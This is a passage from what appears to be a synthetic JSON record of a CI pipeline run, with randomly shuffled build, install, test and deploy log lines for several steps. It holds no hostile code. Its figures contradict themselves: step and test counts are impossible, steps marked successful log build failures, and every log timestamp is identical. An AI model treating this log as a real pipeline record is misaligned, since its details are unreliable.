          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "  PASS: test_user_create (410ms)",
          "Compiling utils/utils.go...",
          "Compiling utils/handler.rs...",
          "Cache miss for key-4614",
          "pip: Collecting jest",
          "[12:46:28] DEBUG: Loading configuration",
          "Artifact downloaded: 13MB",
          "FAILED: test_api_health",
          "Installing react@5.12.6",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-11T12:47:02.674784",
        "finished_at": "2025-12-11T12:47:26.900024",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 2/23: Linting",
          "pip: Installing build dependencies...",
          "Step 14/16: Testing",
          "Compiling src/index.js...",
          "Minifying app.js",
          "Processing...",
          "\u2713 Task completed in 3595ms",
          "[12:46:28] DEBUG: Query executed in 56ms",
          "yarn add: Done in 21.3s",
          "Ready.",
          "yarn add: Done in 5.54s",
          "Cache hit for key-4255",
          "WARNING: eslint has known vulnerabilities",
          "Already up to date.",
          "npm install: added 63 packages",
          "\u2713 lint completed",
          "npm install: resolved 1701 packages",
          "GET /status - 201 (74ms)",
          "Ran 63 tests in 30s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: e2e/test_db_connect.spec.js",
          "Verifying...",
          "[12:46:28] DEBUG: Memory usage: 522MB",
          "Cache saved successfully",
          "Waiting...",
          "Step 8/15: Building",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "[12:46:28] INFO: Connecting to database",
          "Transforming 545 files...",
          "  PASS: test_auth_login (461ms)",
          "Compiling lib/utils.go...",
          "Cache miss for key-6999",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing webpack@2.3.2",
          "Switched to branch 'bugfix/task-753'",
          "[12:46:28] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "GET /api - 200 (19ms)",
          "Ready.",
          "TLS handshake completed",
          "Step 15/23: Installing dependencies",
          "\u2713 All checks passed",
          "Snapshots: 35 passed, 46 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "TLS handshake completed",
          "Creating production build...",
          "Compiling components/app.ts...",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (97ms)",
          "Layer 9/8: ENV command",
          "Building Docker image...",
          "[12:46:28] ERROR: Connection failed",
          "HEAD is now at b0697c0",
          "Snapshots: 24 passed, 21 total",
          "Pulling image: python:18",
          "  PASS: test_db_connect (167ms)",
          "WARNING: express has known vulnerabilities",
          "\u2713 Task completed in 3711ms",
          "Artifact downloaded: 44MB",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Finished.",
          "[12:46:28] DEBUG: Connection pool: 9 active",
          "Checking out main branch",
          "[12:46:28] DEBUG: Query executed in 15ms",
          "Step 13/22: Deploying",
          "Switched to branch 'hotfix/task-919'",
          "pip install: Successfully installed axios-2.2",
          "Compiling lib/index.js...",
          "Cache saved successfully",
          "Installing prettier@1.14.1",
          "Done.",
          "Cache hit for key-3516",
          "Artifact downloaded: 2MB",
          "[12:46:28] INFO: Processing request",
          "Fetching submodules...",
          "Artifact downloaded: 45MB",
          "[12:46:28] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:46:28] INFO: Connecting to database",
          "HEAD is now at cbc5f30",
          "Layer 4/14: RUN command",
          "Installing jest@5.2.0",
          "[12:46:28] INFO: Starting build process",
          "npm install: resolved 357 packages",
          "Compiling components/handler.rs...",
          "yarn add: Done in 23.41s",
          "Processing...",
          "Artifact downloaded: 16MB",
          "Success!",
          "Transforming 308 files...",
          "[12:46:28] WARN: Deprecated API usage",
          "Time: 112.964s",
          "Artifact uploaded: dist.zip (85MB)",
          "HEAD is now at c825078",
          "Using Python 3.11",
          "pip: Installing build dependencies...",
          "GET /api - 204 (57ms)",
          "Cache restored successfully (382MB)",
          "NODE_ENV=production",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Environment: staging",
          "Optimizing 68 modules...",
          "Step 4/15: Linting",
          "Generating source maps...",
          "npm install: added 25 packages",
          "Tests: 191 passed, 436 total",
          "Ready.",
          "  PASS: test_user_create (370ms)",
          "Image pulled successfully",
          "[12:46:28] INFO: Request completed",
          "[12:46:28] INFO: Processing request",
          "  PASS: integration/test_auth_login.spec.js",
          "Compiling components/handler.rs...",
          "Fetching submodules...",
          "POST /upload - 200 (180ms)",
          "Step 19/23: Linting",
          "Pushing to registry...",
          "Done.",
          "npm install: resolved 309 packages",
          "\u2713 All checks passed",
          "Cache hit for key-2212",
          "\u2713 All checks passed",
          "Step 13/23: Testing",
          "Building Docker image...",
          "Creating production build...",
          "yarn add: Done in 24.19s",
          "Step 17/25: Installing dependencies",
          "Finished.",
          "Checking out main branch",
          "[12:46:28] INFO: Cache refreshed",
          "Coverage: 76% statements, 70% branches",
          "Verifying...",
          "Transforming 837 files...",
          "Finished.",
          "Finished.",
          "Artifact uploaded: build.tar.gz (13MB)",
          "GET /api - 204 (48ms)",
          "[12:46:28] DEBUG: Query executed in 13ms",
          "Building Docker image...",
          "[12:46:28] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "\u2713 All checks passed",
          "WARNING: prettier has known vulnerabilities",
          "Ran 124 tests in 20s",
          "Compiling components/app.ts...",
          "\u2717 build failed with exit code 23",
          "Transforming 983 files...",
          "Pushing to registry...",
          "Compiling utils/main.py...",
          "WARNING: react has known vulnerabilities",
          "Snapshots: 37 passed, 34 total",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-11T12:47:26.900024",
        "finished_at": "2025-12-11T12:47:51.125264",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 5/22: Running migrations",
          "pip: Downloading prettier-1.15.tar.gz",
          "Installing lodash@1.2.8",
          "pip: Installing build dependencies...",
          "[12:46:28] DEBUG: Memory usage: 1222MB",
          "POST /upload - 201 (311ms)",
          "npm notice: package.json updated",
          "[12:46:28] WARN: Deprecated API usage",
          "Uploading artifact 'build' (9 files)",
          "Step 19/15: Building",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Pulling image: node:latest",
          "Tests: 408 passed, 452 total",
          "Step 13/18: Building",
          "Optimizing 43 modules...",
          "Compiling utils/handler.rs...",
          "[12:46:28] ERROR: Connection failed",
          "Cache saved successfully",
          "[12:46:28] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "npm install: added 100 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact downloaded: 14MB",
          "[12:46:28] DEBUG: Initializing service",
          "Environment: production",
          "Step 6/21: Testing",
          "TLS handshake completed",
          "Environment: production",
          "POST /data - 201 (178ms)",
          "[12:46:28] INFO: Cache refreshed",
          "Already up to date.",
          "[12:46:28] DEBUG: Loading configuration",
          "[12:46:28] INFO: Request completed",
          "Test Suites: 25 passed, 5 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'install' succeeded",
          "Pushing to registry...",
          "Compiling components/app.ts...",
          "Switched to branch 'feature/task-129'",
          "[12:46:28] INFO: Processing request",
          "pip install: Successfully installed express-5.4",
          "Waiting...",
          "OK",
          "Step 8/15: Testing",
          "Cache hit for key-9492",
          "[12:46:28] WARN: Deprecated API usage",
          "Artifact downloaded: 2MB",
          "Artifact downloaded: 47MB",
          "npm notice: created a lockfile",
          "pip: Collecting lodash",
          "Ready.",
          "WARNING: express has known vulnerabilities",
          "Completed.",
          "Cache invalidated: dependencies",
          "Processing...",
          "Waiting...",
          "[12:46:28] WARN: Deprecated API usage",
          "Done.",
          "[12:46:28] DEBUG: Query executed in 8ms",
          "\u2713 Task completed in 2385ms",
          "Step 10/15: Testing",
          "Uploading artifact 'coverage' (23 files)",
          "pip: Installing build dependencies...",
          "Cache miss for key-4129",
          "Snapshots: 21 passed, 45 total",
          "Compiling utils/app.ts...",
          "Waiting...",
          "[12:46:28] INFO: Request completed",
          "Cache hit for key-3935",
          "[12:46:28] INFO: Cache refreshed",
          "yarn add: Done in 5.88s",
          "Success!",
          "Compiling utils/service.java...",
          "Tests: 225 passed, 488 total",
          "pip: Downloading axios-2.6.tar.gz",
          "pip: Installing build dependencies...",
          "Connection established",
          "Artifact uploaded: dist.zip (38MB)",
          "Compiling src/app.ts...",
          "Cache miss for key-2835",
          "Step 13/23: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (15MB)",
          "Bundling runtime.css",
          "pip install: Successfully installed lodash-1.16",
          "NODE_ENV=production",
          "Step 13/19: Installing dependencies",
          "Pushing to registry...",
          "Waiting...",
          "[12:46:28] DEBUG: Memory usage: 489MB",
          "npm notice: created a lockfile",
          "[12:46:28] ERROR: Connection failed",
          "npm notice: package.json updated",
          "yarn add: Done in 19.24s",
          "Processing...",
          "Done.",
          "\u2713 All checks passed",
          "Connection established",
          "Cache hit for key-2726",
          "OK",
          "Coverage: 89% statements, 96% branches",
          "Fetching submodules...",
          "[12:46:28] INFO: Starting build process",
          "Coverage: 79% statements, 65% branches",
          "npm install: added 27 packages",
          "Step 7/25: Deploying",
          "[12:46:28] DEBUG: Memory usage: 769MB",
          "Compiling components/service.java...",
          "npm install: resolved 1243 packages",
          "TLS handshake completed",
          "Uploading artifact 'dist' (42 files)",
          "[12:46:28] DEBUG: Query executed in 96ms",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 All checks passed",
          "[12:46:28] DEBUG: Loading configuration",
          "Layer 7/12: COPY command",
          "Fetching from https://githubusercontent.com/package.json",
          "Platform: darwin-arm64",
          "Connection established",
          "Coverage: 74% statements, 76% branches",
          "NODE_ENV=development",
          "FAILED: test_auth_login",
          "Connection established",
          "pip: Collecting eslint",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "pip: Downloading prettier-2.3.tar.gz",
          "Layer 3/11: RUN command",
          "Using Node.js 17.13.8",
          "WARNING: axios has known vulnerabilities",
          "Step 12/15: Deploying",
          "Layer 4/10: RUN command",
          "[12:46:28] WARN: Deprecated API usage",
          "Layer 6/14: RUN command",
          "Environment: production",
          "[12:46:28] INFO: Request completed",
          "[12:46:28] DEBUG: Connection pool: 15 active",
          "Artifact uploaded: dist.zip (6MB)",
          "[12:46:28] INFO: Cache refreshed",
          "Installing express@3.12.6",
          "Processing...",
          "Checking out master branch",
          "Uploading artifact 'dist' (28 files)",
          "Artifact downloaded: 7MB",
          "Using Node.js 18.15.2",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Finished.",
          "Coverage: 92% statements, 81% branches",
          "Pushing to registry...",
          "npm install: resolved 1300 packages",
          "Processing...",
          "Ran 36 tests in 6s",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-11T12:47:51.125264",
        "finished_at": "2025-12-11T12:48:15.350504",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Compiling components/service.java...",
          "  PASS: integration/test_auth_login.spec.js",
          "yarn add: Done in 6.69s",
          "Compiling lib/index.js...",
          "Switched to branch 'bugfix/task-835'",
          "Ready.",
          "Creating production build...",
          "Switched to branch 'hotfix/task-271'",
          "\u2713 Task completed in 2767ms",
          "Compiling lib/service.java...",
          "[12:46:28] DEBUG: Query executed in 100ms",
          "Checking out develop branch",
          "pip install: Successfully installed axios-3.5",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 17/21: Deploying",
          "[12:46:28] WARN: Deprecated API usage",
          "[12:46:28] DEBUG: Memory usage: 1076MB",
          "Step 5/25: Building",
          "Step 9/24: Installing dependencies",
          "Finished.",
          "Step 12/18: Linting",
          "Installing eslint@4.15.1",
          "Environment: staging",
          "[12:46:28] INFO: Starting build process",
          "TLS handshake completed",
          "OK",
          "  PASS: test_auth_login (52ms)",
          "Compiling src/index.js...",
          "Artifact downloaded: 34MB",
          "pip: Collecting prettier",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /api - 201 (76ms)",
          "Cache invalidated: build",
          "Cache invalidated: build",
          "[12:46:28] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (24MB)",
          "Pushing to registry...",
          "npm install: added 387 packages",
          "Transforming 774 files...",
          "Cache invalidated: build",
          "Step 16/20: Deploying",
          "Building Docker image...",
          "Ready.",
          "\u2713 Task completed in 3589ms",
          "[12:46:28] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed jest-3.18",
          "[12:46:28] WARN: Deprecated API usage",
          "Compiling components/main.py...",
          "Installing webpack@4.7.7",
          "Success!",
          "Optimizing 38 modules...",
          "Processing...",
          "Cache miss for key-6121",
          "Already up to date.",
          "Step 3/18: Testing",
          "[12:46:28] DEBUG: Initializing service",
          "[12:46:28] INFO: Cache refreshed",
          "Switched to branch 'feature/task-509'",
          "pip: Downloading jest-5.8.tar.gz",
          "pip: Collecting prettier",
          "Success!",
          "Completed.",
          "Checking out main branch",
          "npm notice: created a lockfile",
          "Coverage: 84% statements, 88% branches",
          "Fetching from https://npmjs.org/package.json",
          "Fetching submodules...",
          "Minifying main.js",
          "Snapshots: 36 passed, 44 total",
          "[12:46:28] DEBUG: Query executed in 75ms",
          "Optimizing 11 modules...",
          "NODE_ENV=test",
          "[12:46:28] INFO: Processing request",
          "\u2713 package completed",
          "yarn add: Done in 2.12s",
          "GET /health - 201 (32ms)",
          "[12:46:28] DEBUG: Initializing service",
          "Creating production build...",
          "Uploading artifact 'coverage' (36 files)",
          "pip: Collecting react",
          "\u2713 Step 'setup' succeeded",
          "[12:46:28] INFO: Starting build process",
          "Tests: 67 passed, 381 total",
          "Step 3/20: Building",
          "Compiling utils/utils.go...",
          "Pulling image: alpine:latest",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Waiting...",
          "Uploading artifact 'coverage' (10 files)",
          "Environment: production",
          "\u2713 validate completed",
          "Bundling runtime.js",
          "Switched to branch 'hotfix/task-905'",
          "npm install: added 166 packages",
          "\u2713 All checks passed",
          "WARNING: axios has known vulnerabilities",
          "[12:46:28] WARN: Deprecated API usage",
          "Finished.",
          "Pushing to registry...",
          "Layer 4/13: COPY command",
          "npm notice: created a lockfile",
          "GET /api - 201 (42ms)",
          "Finished.",
          "[12:46:28] ERROR: Connection failed",
          "NODE_ENV=production",
          "Checking out main branch",
          "Artifact uploaded: dist.zip (90MB)",
          "npm notice: created a lockfile",
          "\u2713 validate completed",
          "TLS handshake completed",
          "Cache restored successfully (368MB)",
          "OK",
          "[12:46:28] INFO: Processing request",
          "Environment: production",
          "Step 7/21: Deploying",
          "[12:46:28] INFO: Processing request",
          "[12:46:28] INFO: Cache refreshed",
          "Minifying vendor.js",
          "Compiling lib/app.ts...",
          "Platform: win32-x64",
          "Step 1/24: Running migrations",
          "OK",
          "NODE_ENV=test",
          "TLS handshake completed",
          "[12:46:28] INFO: Request completed",
          "Optimizing 40 modules...",
          "Image pulled successfully",
          "pip: Downloading prettier-2.5.tar.gz",
          "Compiling lib/handler.rs...",
          "Cache invalidated: dependencies",
          "Installing axios@4.10.10",
          "FAILED: test_cache_hit",
          "\u2713 All checks passed",
          "Test Suites: 14 passed, 32 total",
          "pip install: Successfully installed lodash-4.18",
          "Using Python 3.12",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing lodash@2.9.4",
          "Environment: development",
          "Artifact downloaded: 47MB",
          "Building Docker image...",
          "Snapshots: 13 passed, 16 total",
          "Pushing to registry...",
          "Using Node.js 20.13.7",
          "Ready.",
          "Ran 100 tests in 56s",
          "[12:46:28] INFO: Starting build process",
          "[12:46:28] INFO: Starting build process",
          "NODE_ENV=test",
          "Success!",
          "Fetching submodules...",
          "Step 14/18: Running migrations",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-11T12:48:15.350504",
        "finished_at": "2025-12-11T12:48:39.575744",
        "log_lines": [
          "=== Step: setup_node ===",
          "Checking out master branch",
          "Platform: win32-x64",
          "Creating production build...",
          "\u2713 Task completed in 587ms",
          "Cache saved successfully",
          "Exception: ValueError",
          "[12:46:28] INFO: Connecting to database",
          "Transforming 606 files...",
          "Bundling styles.js",
          "Bundling runtime.js",
          "NODE_ENV=development",
          "HEAD is now at db54029",
          "Completed.",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=development",
          "OK",
          "pip install: Successfully installed webpack-1.15",
          "Optimizing 22 modules...",
          "yarn add: Done in 21.2s",
          "Cache saved successfully",
          "[12:46:28] INFO: Connecting to database",
          "Step 13/20: Building",
          "Using Node.js 17.15.8",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "Already up to date.",
          "Step 8/17: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Compiling utils/main.py...",
          "[12:46:28] DEBUG: Connection pool: 11 active",
          "Verifying...",
          "npm notice: created a lockfile",
          "[12:46:28] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "WARNING: express has known vulnerabilities",
          "[12:46:28] INFO: Starting build process",
          "Building Docker image...",
          "Compiling lib/main.py...",
          "Snapshots: 3 passed, 18 total",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:46:28] DEBUG: Connection pool: 17 active",
          "[12:46:28] INFO: Request completed",
          "[12:46:28] INFO: Connecting to database",
          "Tests: 297 passed, 68 total",
          "POST /upload - 200 (89ms)",
          "Using Node.js 19.6.7",
          "Using Python 3.12",
          "pip install: Successfully installed axios-1.4",
          "Time: 102.950s",
          "\u2713 Task completed in 4545ms",
          "Fetching submodules...",
          "[12:46:28] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Compiling lib/app.ts...",
          "pip: Downloading react-3.14.tar.gz",
          "Ready.",
          "Connection established",
          "Compiling src/index.js...",
          "Connection established",
          "[12:46:28] DEBUG: Memory usage: 1756MB",
          "Snapshots: 45 passed, 14 total",
          "Generating source maps...",
          "Pushing to registry...",
          "Installing eslint@5.9.7",
          "Minifying vendor.js",
          "Test Suites: 5 passed, 16 total",
          "Step 1/17: Building",
          "Step 9/18: Testing",
          "Step 18/25: Running migrations",
          "npm install: resolved 123 packages",
          "Waiting...",
          "npm install: resolved 1577 packages",
          "Processing...",
          "[12:46:28] DEBUG: Memory usage: 1466MB",
          "\u2713 All checks passed",
          "Ready.",
          "\u2713 Task completed in 278ms",
          "Already up to date.",
          "Ready.",
          "Test Suites: 17 passed, 8 total",
          "Test Suites: 40 passed, 47 total",
          "POST /upload - 200 (209ms)",
          "[12:46:28] DEBUG: Memory usage: 1140MB",
          "\u2713 All checks passed",
          "[12:46:28] WARN: Deprecated API usage",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:46:28] INFO: Request completed",
          "Pulling image: node:latest",
          "npm install: added 78 packages",
          "[12:46:28] DEBUG: Initializing service",
          "Transforming 127 files...",
          "npm install: resolved 1900 packages",
          "Cache hit for key-9417",
          "[12:46:28] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "Step 5/17: Testing",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: created a lockfile",
          "Success!",
          "Compiling components/handler.rs...",
          "pip install: Successfully installed axios-3.17",
          "Already up to date.",
          "Done.",
          "Layer 6/14: RUN command",
          "  PASS: e2e/test_user_create.spec.js",
          "Fetching from https://docker.io/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching submodules...",
          "Compiling components/index.js...",
          "pip: Installing build dependencies...",
          "[12:46:28] DEBUG: Memory usage: 120MB",
          "[12:46:28] DEBUG: Query executed in 47ms",
          "  PASS: test_cache_hit (35ms)",
          "WARNING: webpack has known vulnerabilities",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "npm install: resolved 393 packages",
          "HEAD is now at f91d421",
          "WARNING: axios has known vulnerabilities",
          "[12:46:28] INFO: Processing request",
          "pip install: Successfully installed express-4.8",
          "npm install: added 470 packages",
          "Using Python 3.9",
          "Pulling image: python:latest",
          "Step 7/16: Deploying",
          "pip: Collecting jest",
          "Transforming 770 files...",
          "Platform: linux-x64",
          "pip: Downloading axios-5.12.tar.gz",
          "Finished.",
          "OK",
          "Transforming 211 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "Processing...",
          "Layer 9/14: COPY command",
          "Using Node.js 18.2.1",
          "Step 13/21: Deploying",
          "WARNING: jest has known vulnerabilities",
          "pip: Downloading webpack-1.3.tar.gz",
          "\u2713 All checks passed",
          "\u2713 Step 'build' succeeded",
          "pip: Downloading eslint-4.15.tar.gz",
          "npm notice: package.json updated",
          "WARNING: jest has known vulnerabilities",
          "Compiling utils/handler.rs...",
          "Transforming 376 files...",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Finished.",
          "[12:46:28] INFO: Starting build process",
          "Success!",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-11T12:48:39.575744",
        "finished_at": "2025-12-11T12:48:54.110888",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Creating production build...",
          "Ran 183 tests in 35s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "GET /api - 200 (80ms)",
          "Transforming 801 files...",
          "pip: Installing build dependencies...",
          "Done.",
          "GET /health - 204 (29ms)",
          "[12:46:28] ERROR: Connection failed",
          "Environment: production",
          "NODE_ENV=production",
          "Step 18/17: Linting",
          "HEAD is now at e9de53e",
          "Ready.",
          "[12:46:28] WARN: Deprecated API usage",
          "Finished.",
          "Loading...",
          "\u2713 All checks passed",
          "[12:46:28] WARN: Deprecated API usage",
          "Generating source maps...",
          "POST /upload - 202 (145ms)",
          "[12:46:28] DEBUG: Initializing service",
          "[12:46:28] DEBUG: Query executed in 14ms",
          "npm notice: created a lockfile",
          "[12:46:28] WARN: Deprecated API usage",
          "Fetching from https://npmjs.org/package.json",
          "Optimizing 13 modules...",
          "Minifying vendor.js",
          "Coverage: 97% statements, 69% branches",
          "pip: Downloading react-5.12.tar.gz",
          "[12:46:28] WARN: Deprecated API usage",
          "Step 7/15: Building",
          "Cache miss for key-7019",
          "Artifact downloaded: 47MB",
          "Pushing to registry...",
          "Pulling image: alpine:3.11",
          "Verifying...",
          "Compiling lib/main.py...",
          "Cache invalidated: dependencies",
          "Coverage: 83% statements, 70% branches",
          "Cache miss for key-3235",
          "npm install: resolved 1187 packages",
          "[12:46:28] INFO: Request completed",
          "  PASS: unit/test_db_connect.spec.js",
          "OK",
          "[12:46:28] ERROR: Connection failed",
          "Using Python 3.11",
          "Compiling src/index.js...",
          "[12:46:28] INFO: Cache refreshed",
          "[12:46:28] INFO: Starting build process",
          "Using Python 3.10",
          "Finished.",
          "Exception: RuntimeError",
          "[12:46:28] WARN: Deprecated API usage",
          "Connection established",
          "[12:46:28] DEBUG: Memory usage: 1027MB",
          "Connection established",
          "Artifact downloaded: 18MB",
          "GET /health - 201 (79ms)",
          "[12:46:28] WARN: Deprecated API usage",
          "[12:46:28] INFO: Processing request",
          "[12:46:28] DEBUG: Connection pool: 19 active",
          "\u2713 Step 'test' succeeded",
          "Compiling lib/handler.rs...",
          "Snapshots: 33 passed, 44 total",
          "Step 5/23: Installing dependencies",
          "pip install: Successfully installed express-3.15",
          "[12:46:28] INFO: Connecting to database",
          "npm install: resolved 473 packages",
          "  PASS: test_user_create (259ms)",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Time: 75.955s",
          "WARNING: eslint has known vulnerabilities",
          "Image pulled successfully",
          "Exception: RuntimeError",
          "npm install: resolved 1761 packages",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "Snapshots: 40 passed, 18 total",
          "[12:46:28] DEBUG: Connection pool: 11 active",
          "Step 7/16: Installing dependencies",
          "Transforming 610 files...",
          "\u2713 Task completed in 904ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed eslint-3.5",
          "pip: Downloading react-4.14.tar.gz",
          "[12:46:28] INFO: Request completed",
          "Cache saved successfully",
          "Image pulled successfully",
          "Layer 6/15: RUN command",
          "\u2713 Step 'checkout' succeeded",
          "Ready.",
          "[12:46:28] DEBUG: Loading configuration",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:28] INFO: Connecting to database",
          "Compiling src/handler.rs...",
          "Step 6/22: Installing dependencies",
          "npm notice: package.json updated",
          "Step 13/21: Building",
          "[12:46:28] DEBUG: Query executed in 42ms",
          "Cache invalidated: node_modules",
          "Waiting...",
          "\u2713 build completed",
          "Minifying app.js",
          "Exception: ValueError",
          "\u2713 Step 'checkout' succeeded",
          "TLS handshake completed",
          "Installing prettier@1.3.8",
          "Creating production build...",
          "Test Suites: 38 passed, 48 total",
          "npm notice: created a lockfile",
          "Step 11/23: Deploying",
          "Artifact uploaded: dist.zip (43MB)",
          "Using Python 3.12",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "Done.",
          "Artifact uploaded: dist.zip (87MB)",
          "Cache invalidated: build",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Done.",
          "pip: Collecting prettier",
          "Installing react@4.10.3",
          "Minifying app.js",
          "\u2713 validate completed",
          "Compiling components/index.js...",
          "Minifying app.js",
          "Compiling components/main.py...",
          "POST /api - 200 (120ms)",
          "Switched to branch 'feature/task-898'",
          "[12:46:28] WARN: Deprecated API usage",
          "Snapshots: 19 passed, 8 total",
          "Coverage: 92% statements, 83% branches",
          "[12:46:28] INFO: Starting build process",
          "[12:46:28] WARN: Deprecated API usage",
          "Bundling runtime.js",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:28] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 56 modules...",
          "[12:46:28] DEBUG: Query executed in 85ms",
          "\u2713 All checks passed",
          "Cache miss for key-7350",
          "[12:46:28] WARN: Deprecated API usage",
          "Cache restored successfully (188MB)",
          "Building Docker image...",
          "OK",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:28] ERROR: Connection failed",
          "WARNING: express has known vulnerabilities",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-11T12:48:54.110888",
        "finished_at": "2025-12-11T12:49:18.336128",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Ran 27 tests in 3s",
          "Cache restored successfully (288MB)",
          "Cache hit for key-8110",
          "npm notice: package.json updated",
          "OK",
          "Image pulled successfully",
          "Artifact downloaded: 20MB",
          "HEAD is now at e9322e3",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 3937ms",
          "Step 2/24: Linting",
          "Cache restored successfully (460MB)",
          "HEAD is now at 1a84f3a",
          "npm notice: package.json updated",
          "Completed.",
          "WARNING: lodash has known vulnerabilities",
          "Fetching from https://gcr.io/package.json",
          "Compiling src/main.py...",
          "\u2713 Step 'test' succeeded",
          "\u2713 Task completed in 1281ms",
          "Connection established",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 2/20: Testing",
          "OK",
          "Cache miss for key-7704",
          "Artifact uploaded: dist.zip (56MB)",
          "HEAD is now at 8537bb8",
          "WARNING: webpack has known vulnerabilities",
          "Step 18/21: Deploying",
          "Fetching from https://npmjs.org/package.json",
          "Already up to date.",
          "Compiling components/main.py...",
          "Cache hit for key-3206",
          "\u2713 Task completed in 1901ms",
          "Step 12/16: Installing dependencies",
          "Exception: RuntimeError",
          "[12:46:28] DEBUG: Initializing service",
          "Loading...",
          "Tests: 136 passed, 180 total",
          "Step 20/15: Building",
          "Compiling src/main.py...",
          "Time: 114.477s",
          "npm notice: package.json updated",
          "[12:46:28] DEBUG: Initializing service",
          "Bundling vendor.css",
          "Step 13/21: Linting",
          "Compiling src/service.java...",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "[12:46:28] DEBUG: Memory usage: 816MB",
          "Coverage: 92% statements, 83% branches",
          "Image pulled successfully",
          "Installing jest@1.0.6",
          "pip: Downloading express-3.0.tar.gz",
          "OK",
          "Cache miss for key-8992",
          "[12:46:28] INFO: Starting build process",
          "[12:46:28] DEBUG: Loading configuration",
          "Exception: TypeError",
          "\u2713 Step 'setup' succeeded",
          "npm notice: created a lockfile",
          "Cache miss for key-6689",
          "pip: Collecting eslint",
          "Time: 74.1s",
          "Artifact downloaded: 22MB",
          "npm install: added 499 packages",
          "Finished.",
          "\u2713 Step 'setup' succeeded",
          "[12:46:28] DEBUG: Query executed in 93ms",
          "Creating production build...",
          "[12:46:28] DEBUG: Memory usage: 1012MB",
          "Compiling lib/utils.go...",
          "npm install: added 16 packages",
          "\u2713 validate completed",
          "npm install: added 169 packages",
          "Minifying main.js",
          "TLS handshake completed",
          "Transforming 732 files...",
          "Pulling image: python:latest",
          "Optimizing 55 modules...",
          "\u2713 validate completed",
          "Waiting...",
          "Success!",
          "Already up to date.",
          "Artifact downloaded: 41MB",
          "Installing react@5.11.2",
          "Step 19/16: Linting",
          "[12:46:28] INFO: Connecting to database",
          "\u2717 build failed with exit code 96",
          "Checking out develop branch",
          "[12:46:28] INFO: Request completed",
          "Artifact downloaded: 30MB",
          "Ready.",
          "GET /status - 204 (47ms)",
          "Layer 8/9: COPY command",
          "Compiling components/handler.rs...",
          "Pushing to registry...",
          "Tests: 454 passed, 402 total",
          "Compiling src/utils.go...",
          "Already up to date.",
          "Environment: staging",
          "Step 3/16: Testing",
          "Bundling styles.css",
          "Transforming 840 files...",
